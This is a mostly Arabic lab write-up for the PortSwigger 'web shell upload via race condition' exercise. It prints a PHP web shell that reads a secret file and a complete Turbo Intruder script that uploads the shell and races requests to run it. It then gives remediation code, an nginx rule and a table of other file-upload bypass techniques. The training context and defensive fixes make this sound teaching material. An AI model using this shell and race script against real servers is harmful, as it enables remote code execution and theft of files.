# Lab: Web shell upload via race condition

> **Category:** File Upload Vulnerabilities  
> **Difficulty:** EXPERT  
> **Lab Link:** [PortSwigger Lab - Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة **Race Condition** في عملية رفع الملفات. الخادم يرفع الملف أولاً إلى مجلد قابل للوصول، ثم يقوم بالتحقق منه (فحص الفيروسات ونوع الملف). في الفترة الزمنية الصغيرة بين الرفع والفحص، يمكننا تنفيذ Web Shell قبل حذفه.

**الحساب:** `wiener:peter`

**المطلوب:** الحصول على السر (secret) وإرساله.

---

## 🧠 فهم الكود المصاب

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// خطأ: يتم نقل الملف أولاً
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

// ثم يتم التحقق منه
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file has been uploaded.";
} else {
    unlink($target_file); // يتم حذفه إذا فشل التحقق
    echo "Sorry, there was an error.";
}
?>
```

**نقطة الضعف:** هناك **نافذة زمنية** بين `move_uploaded_file` (الرفع) و `unlink` (الحذف) يمكننا خلالها تنفيذ الملف.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تحضير Web Shell

- أنشئ ملف `exploit.php` بالمحتوى:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### الخطوة 2: اعتراض طلب رفع الملف

- في Burp، ابحث عن طلب `POST /my-account/avatar`
- أرسله إلى **Turbo Intruder**

### الخطوة 3: تثبيت Turbo Intruder (إذا لم يكن مثبتاً)

- في Burp، اذهب إلى **Extender** → **BApp Store**
- ابحث عن **Turbo Intruder** → **Install**

### الخطوة 4: إعداد سكريبت Turbo Intruder

- في Turbo Intruder، الصق السكريبت التالي:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)

    # طلب رفع الملف (POST)
    request1 = '''POST /my-account/avatar HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: XXX
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC

------WebKitFormBoundaryABC
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryABC--
'''

    # طلب تنفيذ الملف (GET)
    request2 = '''GET /files/avatars/exploit.php HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE

'''

    # إرسال طلب الرفع مرة واحدة
    engine.queue(request1, gate='race1')
    
    # إرسال 5 طلبات تنفيذ سريعة
    for x in range(5):
        engine.queue(request2, gate='race1')

    # فتح البوابة لإرسال جميع الطلبات معاً
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

### الخطوة 5: تعديل السكريبت بقيم حقيقية

- استبدل `YOUR-LAB-ID` بمعرف مختبرك
- استبدل `YOUR-SESSION-COOKIE` بكوكي الجلسة الخاص بك
- عدّل `Content-Length` ليتوافق مع حجم طلبك (أو احذفها واترك Burp يحسبها)

### الخطوة 6: بدء الهجوم

- في Turbo Intruder، اضغط **Attack**

### الخطوة 7: تحليل النتائج

- ابحث في النتائج عن استجابات (`GET` requests) برمز `200`
- هذه الاستجابات تحتوي على السر (secret)

**مثال للاستجابة الناجحة:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ
```

### الخطوة 8: إرسال السر

- انسخ السر
- ارجع إلى صفحة المختبر
- اضغط **Submit solution** والصق السر

### الخطوة 9: حل المختبر

بعد إرسال السر الصحيح، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي Race Condition؟** | حالة سباق بين عمليتين متنافستين (الرفع والحذف) |
| **لماذا نجح هذا؟** | الخادم يرفع الملف أولاً ثم يتحقق منه، مما يخلق نافذة زمنية |
| **كيف نستغلها؟** | نرفع الملف ونرسل طلبات تنفيذ متعددة بسرعة قبل أن يتم حذفه |
| **لماذا 5 طلبات GET؟** | لزيادة فرصة إصابة النافذة الزمنية |
| **ما هو Turbo Intruder؟** | أداة Burp متقدمة لإرسال الطلبات بسرعة عالية (Python-based) |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يقوم بنقل الملف إلى المجلد العام **قبل** التحقق منه (فيروسات، نوع الملف)، مما يخلق نافذة زمنية يمكن استغلالها.

---

### ❌ Non-Compliant Code (PHP)

```php
<?php
// upload.php - الكود المصاب
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// خطأ: نقل الملف أولاً
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

// ثم التحقق
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "Uploaded successfully";
} else {
    unlink($target_file); // يتم الحذف بعد فوات الأوان
    echo "Error";
}
?>
```

---

### ✅ Compliant Code (PHP - الإصلاح)

```php
<?php
// upload.php - الكود الآمن
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];
$tmp_file = $_FILES["avatar"]["tmp_name"];

// التصحيح 1: التحقق قبل النقل (وليس بعده)
if (checkViruses($tmp_file) && checkFileType($tmp_file)) {
    // فقط بعد التحقق، يتم نقل الملف
    move_uploaded_file($tmp_file, $target_file);
    echo "Uploaded successfully";
} else {
    // حذف الملف المؤقت
    unlink($tmp_file);
    echo "Error";
}
?>
```

```javascript
// Next.js - الإصلاح (مع التحقق قبل الحفظ)
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';
import { v4 as uuidv4 } from 'uuid';
import sharp from 'sharp';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const form = formidable({});
  
  form.parse(req, async (err, fields, files) => {
    const file = files.avatar;
    const extension = path.extname(file.originalFilename).toLowerCase();
    
    // التصحيح 1: التحقق قبل أي عملية حفظ
    const allowedExtensions = ['.jpg', '.png', '.gif'];
    if (!allowedExtensions.includes(extension)) {
      return res.status(400).json({ error: 'Invalid file type' });
    }
    
    // التصحيح 2: فحص محتوى الملف قبل الحفظ
    let isImage = false;
    try {
      const metadata = await sharp(file.filepath).metadata();
      isImage = metadata.format !== undefined;
    } catch {
      isImage = false;
    }
    
    if (!isImage) {
      return res.status(400).json({ error: 'Invalid image' });
    }
    
    // التصحيح 3: الحفظ في مجلد غير قابل للتنفيذ أولاً
    const tempDir = path.join(process.cwd(), 'temp');
    const safeFilename = `${uuidv4()}${extension}`;
    const tempPath = path.join(tempDir, safeFilename);
    
    fs.copyFileSync(file.filepath, tempPath);
    
    // التصحيح 4: فحص إضافي (مضاد فيروسات)
    const isSafe = await scanFile(tempPath);
    if (!isSafe) {
      fs.unlinkSync(tempPath);
      return res.status(400).json({ error: 'File contains malware' });
    }
    
    // التصحيح 5: نقل الملف إلى المجلد العام فقط بعد كل الفحوصات
    const finalDir = path.join(process.cwd(), 'public/files/avatars');
    const finalPath = path.join(finalDir, safeFilename);
    fs.renameSync(tempPath, finalPath);
    
    res.json({ success: true, filename: safeFilename });
  });
}
```

```nginx
# إعدادات Nginx - منع تنفيذ PHP في مجلد الرفع
location /files/avatars {
    location ~ \.php$ {
        return 403;
    }
}
```

**الخلاصة:** 
1. تحقق من الملف **قبل** نقله إلى المجلد العام
2. استخدم مجلداً مؤقتاً غير قابل للوصول للفحص
3. انقل الملف فقط بعد اجتياز جميع الفحوصات
4. استخدم locks أو atomic operations لمنع race conditions

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **تحقق قبل النقل (Validate before move)** | لا تنقل الملف إلى المجلد العام قبل التحقق |
| **استخدم مجلد مؤقت آمن** | خزّن الملفات المرفوعة في مجلد غير قابل للوصول أثناء الفحص |
| **Atomic operations** | استخدم عمليات ذرية (rename) بدلاً من copy + delete |
| **File locking** | استخدم أقفال الملفات لمنع الوصول أثناء الفحص |
| **تعطيل التنفيذ** | امنع تنفيذ PHP في مجلد الرفع |

---

# 📊 ملخص لابات File Upload Vulnerabilities

| # | اللاب | الصعوبة | نوع الثغرة | طريقة الاستغلال |
|---|-------|---------|-----------|----------------|
| 01 | Remote code execution via web shell upload | APPRENTICE | عدم وجود تحقق من الملفات | رفع `exploit.php` مباشرة وتنفيذه |
| 02 | Web shell upload via Content-Type restriction bypass | APPRENTICE | تجاوز فحص Content-Type | تغيير `Content-Type` إلى `image/jpeg` |
| 03 | Web shell upload via path traversal | PRACTITIONER | Path Traversal في اسم الملف | استخدام `..%2f` لرفع الملف إلى `/files` |
| 04 | Web shell upload via extension blacklist bypass | PRACTITIONER | تجاوز القائمة السوداء | رفع `.htaccess` لربط امتداد `.l33t` بـ PHP |
| 05 | Web shell upload via obfuscated file extension | PRACTITIONER | Null Byte Injection | استخدام `%00` لتقطيع الامتداد (`exploit.php%00.jpg`) |
| 06 | Remote code execution via polyglot web shell upload | PRACTITIONER | Polyglot file | إخفاء كود PHP في metadata صورة JPG باستخدام ExifTool |
| 07 | Web shell upload via race condition | EXPERT | Race Condition | استغلال النافذة الزمنية بين الرفع والفحص (Turbo Intruder) |

---


## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)
- [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534711)
- [Race Condition Vulnerability](https://portswigger.net/web-security/race-conditions)
- [File Upload Cheat Sheet](https://portswigger.net/web-security/file-upload)

